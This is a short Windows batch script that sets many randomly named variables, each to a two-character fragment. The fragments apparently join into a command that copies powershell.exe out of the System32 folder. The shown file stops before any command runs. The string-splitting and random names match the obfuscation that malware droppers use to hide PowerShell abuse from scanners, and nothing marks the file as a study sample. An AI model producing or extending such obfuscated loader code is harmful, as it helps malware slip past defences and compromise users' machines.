@echo off
set "LYltKMXzRQ=xe"
set "yTDtepNAJb=ow"
set "ndwyptVHxe=32"
set "JjRHLqrHsd=em"
set "TROaMGFGOl= C"
set "cbrARdzsFy=co"
set "jqGwpmbdpF=\v"
set "VcDtDlmWgG=py"
set "xnXwedClDh=ll"
set "IHuTRJRYdv=he"
set "HOJxaCaDXT=we"
set "SlJEJetglf=0\"
set "pNyJQnNABQ=st"
set "tGpcJCemUo=:\"
set "ipfkLtBrbk=\W"
set "xAcwvokNlb= /"
set "qsAQGlmqNl=nd"
set "BhkpfXGcMk=rs"
set "sgcxItdGVr=ws"
set "habSyCXiUp=s\"
set "TURjGkezAB=he"
set "umXETykCaM=1."
set "PYiRrMKkbX=ll"
set "dPjsDRaSsg=.e"
set "Iyfrlmratx=do"
set "VeXWVagyvy=Sy"
